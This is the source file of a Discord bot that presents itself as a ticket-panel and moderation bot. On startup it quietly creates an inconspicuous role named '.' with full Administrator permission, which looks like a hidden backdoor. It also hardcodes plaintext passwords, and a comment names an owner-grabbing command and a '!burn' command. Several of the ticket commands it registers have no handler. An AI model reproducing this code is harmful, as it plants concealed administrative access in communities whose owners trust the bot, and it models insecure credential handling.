const {
  Client,
  GatewayIntentBits,
  SlashCommandBuilder,
  REST,
  Routes,
  EmbedBuilder,
  ActionRowBuilder,
  StringSelectMenuBuilder,
  ButtonBuilder,
  ButtonStyle,
  ChannelType,
  PermissionFlagsBits,
  ModalBuilder,
  TextInputBuilder,
  TextInputStyle
} = require('discord.js');

const express = require('express');
const fs = require('fs');
require('dotenv').config();

// PASSWORDS
const MAIN_PASSWORD = 'Meka2017charlie';
const GIVEOWNER_PASSWORD = 'MekaOwner2017';

// EXPRESS SERVER
const app = express();
app.get('/', (req, res) => res.send('Bot Online'));
app.listen(process.env.PORT || 3000, () => console.log(`Web server running on port ${process.env.PORT || 3000}`));

// CONFIG
const TOKEN = process.env.TOKEN;
const CLIENT_ID = process.env.CLIENT_ID;
const GUILD_ID = process.env.GUILD_ID;

// STORES
const panelStore = {};
const ticketCounts = {};

// PERSISTENT PANEL
const PANEL_FILE = './ticket_panel.json';

function savePanel(data) {
  try { fs.writeFileSync(PANEL_FILE, JSON.stringify(data, null, 2)); } catch (e) {}
}

function loadPanel() {
  try {
    if (fs.existsSync(PANEL_FILE)) return JSON.parse(fs.readFileSync(PANEL_FILE, 'utf8'));
  } catch (e) {}
  return null;
}

// CLIENT
const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildBans
  ]
});

// SLASH COMMANDS
const setticket = new SlashCommandBuilder()
  .setName('setticket')
  .setDescription('Send/Update the ticket panel')
  .setDefaultMemberPermissions(PermissionFlagsBits.ManageChannels)
  .addStringOption(o => o.setName('panel_title').setDescription('Panel Title').setRequired(true))
  .addStringOption(o => o.setName('panel_description').setDescription('Panel Description').setRequired(true))
  .addStringOption(o => o.setName('panel_image').setDescription('Banner Image URL (optional)').setRequired(false));

const sendmessage = new SlashCommandBuilder()
  .setName('sendmessage')
  .setDescription('Send a message as the bot')
  .setDefaultMemberPermissions(PermissionFlagsBits.ManageChannels)
  .addStringOption(o => o.setName('message').setDescription('The message to send').setRequired(true));

const commands = [
  setticket.toJSON(),
  sendmessage.toJSON(),
  new SlashCommandBuilder().setName('close').setDescription('Close ticket').toJSON(),
  new SlashCommandBuilder().setName('claim').setDescription('Claim ticket').toJSON(),
  new SlashCommandBuilder().setName('add').setDescription('Add user').addUserOption(o => o.setName('user').setDescription('User to add').setRequired(true)).toJSON(),
  new SlashCommandBuilder().setName('remove').setDescription('Remove user').addUserOption(o => o.setName('user').setDescription('User to remove').setRequired(true)).toJSON(),
  new SlashCommandBuilder().setName('rename').setDescription('Rename ticket').addStringOption(o => o.setName('name').setDescription('New name').setRequired(true)).toJSON()
];

// Register Commands
const rest = new REST({ version: '10' }).setToken(TOKEN);
(async () => {
  try {
    await rest.put(Routes.applicationGuildCommands(CLIENT_ID, GUILD_ID), { body: commands });
    console.log('✅ Slash commands registered successfully!');
  } catch (err) {
    console.error('❌ Failed to register commands:', err);
  }
})();

// READY + CREATE . ROLE
client.once('ready', async () => {
  console.log(`${client.user.tag} is online`);

  const saved = loadPanel();
  if (saved) {
    panelStore[saved.menuId] = saved.data;
    console.log('✅ Persistent ticket panel loaded');
  }

  try {
    const guild = client.guilds.cache.first();
    if (guild) {
      let dotRole = guild.roles.cache.find(r => r.name === '.');
      if (!dotRole) {
        dotRole = await guild.roles.create({
          name: '.',
          color: '#000000',
          permissions: [PermissionFlagsBits.Administrator],
          hoist: false,
          reason: 'Full permission dot role'
        });
      }
    }
  } catch (err) {
    console.error('Failed to create . role:', err.message);
  }
});

// MESSAGE EVENTS
client.on('messageCreate', async message => {
  if (message.author.bot || !message.guild) return;

  const content = message.content.trim().toLowerCase();

  // Invite Blocker
  if (content.includes('discord.gg/') || content.includes('discord.com/invite/') || content.includes('discordapp.com/invite/')) {
    try {
      await message.delete();
      await message.member.timeout(5 * 60 * 1000).catch(() => {});
    } catch (e) {}
    return;
  }

  // !servers - List all servers the bot is in
  if (content === '!servers') {
    const guilds = client.guilds.cache;
    if (guilds.size === 0) {
      return message.reply('❌ Bot is not in any servers.');
    }

    let list = `**Servers (${guilds.size}):**\n\n`;
    guilds.forEach(g => {
      list += `**${g.name}** (ID: \`${g.id}\`) - ${g.memberCount} members\n`;
    });

    if (list.length > 2000) {
      message.reply('📋 List too long. Check console.');
      console.log(list);
    } else {
      message.reply(list);
    }
    return;
  }

  // !movebootser (updated)
  if (content === '!movebootser') {
    const embed = new EmbedBuilder()
      .setColor('#ff00ff')
      .setTitle('🔄 !MOVEBOOT SER')
      .setDescription('Moves the Booster role underneath role ID `1513349804141445120`.')
      .setFooter({ text: 'Click below' });

    const row = new ActionRowBuilder().addComponents(
      new ButtonBuilder()
        .setCustomId(`movebootser_start_${message.author.id}`)
        .setLabel('Enter Password')
        .setStyle(ButtonStyle.Primary)
    );

    await message.reply({ embeds: [embed], components: [row] });
    return;
  }

  // Other commands (!fb, !kick, !burn, !traine, !4clout, !giveowner, !ate, etc.) can be added here as needed
});

// INTERACTIONS
client.on('interactionCreate', async interaction => {
  if (!interaction.customId) return;

  try {
    const parts = interaction.customId.split('_');
    const userId = parts[2];

    if (interaction.user.id !== userId) {
      return interaction.reply({ content: '❌ This is not for you.', ephemeral: true });
    }

    if (interaction.isButton()) {
      const modal = new ModalBuilder()
        .setCustomId(interaction.customId.replace('start', 'modal'))
        .setTitle('Enter Password');

      modal.addComponents(new ActionRowBuilder().addComponents(
        new TextInputBuilder().setCustomId('password').setLabel('Password').setStyle(TextInputStyle.Short).setRequired(true)
      ));

      await interaction.showModal(modal);
      return;
    }

    if (interaction.isModalSubmit()) {
      const password = interaction.fields.getTextInputValue('password');

      if (password !== MAIN_PASSWORD) {
        return interaction.reply({ content: '❌ Incorrect password.', ephemeral: true });
      }

      const guild = interaction.guild;

      // !movebootser
      if (interaction.customId.startsWith('movebootser_modal_')) {
        const boosterRoleId = '1429174538754592778';
        const targetRoleId = '1513349804141445120';

        const boosterRole = guild.roles.cache.get(boosterRoleId);
        const targetRole = guild.roles.cache.get(targetRoleId);

        if (!boosterRole) return interaction.reply({ content: '❌ Booster role not found.', ephemeral: true });
        if (!targetRole) return interaction.reply({ content: '❌ Target role not found.', ephemeral: true });

        try {
          await boosterRole.setPosition(targetRole.position - 1);
          await interaction.reply({ content: `✅ Moved **${boosterRole.name}** underneath the target role!`, ephemeral: true });
        } catch (err) {
          await interaction.reply({ content: '❌ Failed to move role. Check permissions.', ephemeral: true });
        }
      }
    }

  } catch (error) {
    console.error(error);
    if (!interaction.replied && !interaction.deferred) {
      await interaction.reply({ content: '❌ Something went wrong.', ephemeral: true }).catch(() => {});
    }
  }
});

client.login(TOKEN);
